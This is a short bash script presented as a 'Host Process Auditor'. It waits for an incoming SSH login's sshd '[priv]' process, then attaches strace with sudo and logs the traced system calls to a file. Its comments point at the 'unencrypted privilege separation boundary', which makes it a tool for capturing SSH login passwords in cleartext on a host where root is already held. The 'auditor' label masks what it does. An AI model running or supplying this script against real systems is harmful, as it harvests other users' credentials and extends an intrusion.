#!/bin/bash
echo "[+] Initializing Host Process Auditor..."
echo "[*] Polling system processes waiting for an inbound SSH connection..."

# Loop continuously until the [priv] process appears in the process tree
while true; do
    # Search the process list for an active sshd session containing '[priv]'
    TARGET_PID=$(ps aux | grep "sshd:.*\[priv\]" | grep -v grep | awk '{print $2}')
    
    # If a PID is captured, break out of the polling loop immediately
    if [ ! -z "$TARGET_PID" ]; then
        break
    fi
    
    # Tiny sleep interval to prevent CPU throttling while polling
    sleep 0.1
done

echo -e "\n[+] Target Intercepted!"
echo "[+] Active Privilege Separation Context Isolated: PID $TARGET_PID"
echo "[+] Attaching strace... Output routing directly to 'foo'"
echo "[*] Complete the login on your client terminal, then press Ctrl+C to stop."
echo "------------------------------------------------------------------------"

# Attach strace directly to the unencrypted privilege separation boundary
sudo strace -p "$TARGET_PID" 2> foo